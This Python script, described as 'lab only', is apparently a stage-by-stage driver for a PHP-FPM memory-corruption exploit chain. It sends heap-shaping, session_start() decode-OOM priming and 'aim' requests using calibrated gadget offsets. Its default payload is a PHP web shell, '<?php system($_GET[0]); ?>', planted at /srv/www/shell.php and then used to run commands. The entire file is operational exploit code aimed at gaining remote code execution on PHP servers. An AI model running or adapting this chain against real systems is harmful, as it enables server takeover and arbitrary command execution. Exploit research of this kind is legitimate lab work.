#!/usr/bin/env python3
"""Stage-by-stage driver for FPM constant calibration (lab only).

Reuses the request shapes from code/tools/fpm_chain.py without running the
whole chain, so gdb can inspect the child between stages.

Stages:
  r1       one upload_progress record request (press wall)
  build    73 small + 20 big A records on sid asx
  prime    the session_start() decode-OOM request
  r2a/r2b/r3  the three aim requests (optional)
  all      r1 + build + prime
"""
from __future__ import annotations

import argparse
import os
import sys
import time
from types import SimpleNamespace

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import fpm_chain  # noqa: E402


def make_chain(url: str, press: int, prime_press: int, fields: int,
               field_len: int, big: int, fnlen: int, workers: int,
               settle: float, timeout: float,
               e_off: int = 0x76000, dt_off: int = 0x7C000,
               scalar_push: int = 0x63058, array_push: int = 0x63050,
               writer: int = 0x58238, fstart: int = 100,
               fstart_dt: int | None = None, fstart_e: int | None = None,
               big_dt_size: int = 0, big_e_size: int = 0,
               base_dt: int | None = None,
               base_e: int | None = None,
               lead: int = 0, r3_str_off: int = 0x10,
               r3_dt_used: int = 0, r3_scalars: int = 0,
               victim_sid: str = "", victim_path: str = "",
               r3_key: str = "",
               dup: str = "") -> fpm_chain.Chain:
    a = SimpleNamespace(
        url=url, timeout=timeout,
        e_off=e_off, dt_off=dt_off,
        scalar_push=scalar_push, array_push=array_push, writer=writer,
        filler=131072, fstart=fstart,
        fstart_dt=fstart_dt, fstart_e=fstart_e,
        big_dt_size=big_dt_size, big_e_size=big_e_size,
        base_dt=base_dt, base_e=base_e, lead=lead,
        r3_str_off=r3_str_off,
        r3_dt_used=r3_dt_used,
        r3_scalars=r3_scalars, victim_sid=victim_sid,
        victim_path=victim_path, r3_key=r3_key,
        press=press, prime_press=prime_press,
        fields=fields, field_len=field_len, levels=60,
        small=73, big=big, fnlen=fnlen,
        dup=dup or ("0,2,3," + ",".join(str(i) for i in range(6, 100, 2))),
        workers=workers, attempts=1, settle=settle,
        payload="<?php system($_GET[0]); ?>",
        shell_path="/srv/www/shell.php", shell_url="/shell.php",
        plain="/plain.php", index="/index.php",
        cmd="id", proof="",
    )
    return fpm_chain.Chain(a)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--stage", default="all",
                    choices=("victim", "r1", "build", "prime", "r2a", "r2b", "r3", "big", "all"))
    ap.add_argument("--press", type=int, default=920)
    ap.add_argument("--prime-press", type=int, default=780)
    ap.add_argument("--fields", type=int, default=170)
    ap.add_argument("--field-len", type=int, default=4000)
    ap.add_argument("--big", type=int, default=20)
    ap.add_argument("--fnlen", type=int, default=750000)
    ap.add_argument("--filler", type=int, default=131072)
    ap.add_argument("--workers", type=int, default=1)
    ap.add_argument("--settle", type=float, default=0.5)
    ap.add_argument("--timeout", type=float, default=120.0)
    ap.add_argument("--sid", default="asx")
    ap.add_argument("--record-sid", default="scal")
    # The upload-progress primitive needs a page that actually calls
    # session_start(); /plain.php in our lab does not, so both targets default
    # to /index.php here (docs/research/fpm-128m.md ??1.1 requirement).
    ap.add_argument("--plain", default="/index.php")
    ap.add_argument("--index", default="/index.php")
    # A GET to the target runs session_start() and consumes/resets the stale
    # BG(unserialize) state.  Stage r2a/r2b/r3 must therefore not probe first.
    ap.add_argument("--no-wait", action="store_true",
                    help="skip the initial wait_target GET (use after prime)")
    # Build-specific constants.  These used to be hard-coded to the upstream
    # 8.4.4-dev values, which silently aimed R3 at the wrong writer offset
    # (docs/research/fpm-128m.md ??2.1: our build is 0x58238, not 0x58190).
    ap.add_argument("--e-off", type=lambda x: int(x, 0), default=0x76000)
    ap.add_argument("--dt-off", type=lambda x: int(x, 0), default=0x7C000)
    ap.add_argument("--scalar-push", type=lambda x: int(x, 0), default=0x63058)
    ap.add_argument("--array-push", type=lambda x: int(x, 0), default=0x63050)
    ap.add_argument("--writer", type=lambda x: int(x, 0), default=0x58238)
    ap.add_argument("--fstart", type=int, default=100)
    ap.add_argument("--fstart-dt", type=int, default=None)
    ap.add_argument("--fstart-e", type=int, default=None)
    ap.add_argument("--big-dt-size", type=int, default=0)
    ap.add_argument("--big-e-size", type=int, default=0)
    ap.add_argument("--base-dt", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--base-e", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--lead", type=int, default=0)
    ap.add_argument("--r3-str-off", type=lambda x: int(x, 0), default=0x10)
    ap.add_argument("--r3-dt-used", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--r3-scalars", type=int, default=0,
                    help="N scalar records in the victim session (docs/research/fpm-128m.md)")
    ap.add_argument("--victim-sid", default="")
    ap.add_argument("--victim-path", default="",
                    help="page that stores the N scalar session values; GET before R1/prime")
    ap.add_argument("--r3-key", default="")
    ap.add_argument("--dup", default="",
                    help="comma list of duplicate field indices (default: "
                         "0,2,3,6..98); kengwang's 8M shape needs "
                         "2,3,6,7,290,291,292 + 90..200 even")
    a = ap.parse_args()

    c = make_chain(a.url, a.press, a.prime_press, a.fields, a.field_len,
                   a.big, a.fnlen, a.workers, a.settle, a.timeout,
                   e_off=a.e_off, dt_off=a.dt_off,
                   scalar_push=a.scalar_push, array_push=a.array_push,
                   writer=a.writer, fstart=a.fstart,
                   fstart_dt=a.fstart_dt, fstart_e=a.fstart_e,
                   big_dt_size=a.big_dt_size, big_e_size=a.big_e_size,
                   base_dt=a.base_dt, base_e=a.base_e, lead=a.lead,
                   r3_str_off=a.r3_str_off, r3_dt_used=a.r3_dt_used,
                   r3_scalars=a.r3_scalars, victim_sid=a.victim_sid,
                   victim_path=a.victim_path,
                   r3_key=a.r3_key, dup=a.dup)
    c.filler = a.filler
    c.plain = a.plain
    c.index = a.index
    if not a.no_wait and not c.wait_target():
        print("target not answering", file=sys.stderr)
        return 2

    if a.stage in ("victim", "all") and a.victim_sid and a.victim_path:
        # Must run BEFORE the prime: any GET after it consumes the
        # stale unserialize state (docs/research/fpm-128m.md).
        st, _ = c.t.req("GET", a.victim_path,
                        cookie="PHPSESSID=" + a.victim_sid,
                        timeout=20.0, tries=3)
        print("victim session %s -> %s" % (a.victim_sid, st), flush=True)
        c.wait_target()
    if a.stage in ("r1", "all"):
        print("R1 ->", c.record_request(a.record_sid, c.payload)[0], flush=True)
        c.wait_target()
        c.disarm()
        time.sleep(0.5)
    if a.stage in ("build", "all"):
        print("build_a ->", flush=True)
        c.build_a(a.sid)
    if a.stage in ("prime", "all"):
        print("prime ->", c.prime_request(a.sid)[0], flush=True)
        time.sleep(1.0)
    if a.stage == "big":
        c.filler = a.filler
        print("big ->", c.decode_request(a.record_sid, b"K", []), flush=True)
    if a.stage == "r2a":
        print("r2a ->", c.stage_r2a(a.record_sid), flush=True)
    if a.stage == "r2b":
        print("r2b ->", c.stage_r2b(a.record_sid), flush=True)
    if a.stage == "r3":
        print("r3 ->", c.stage_r3(a.record_sid), flush=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
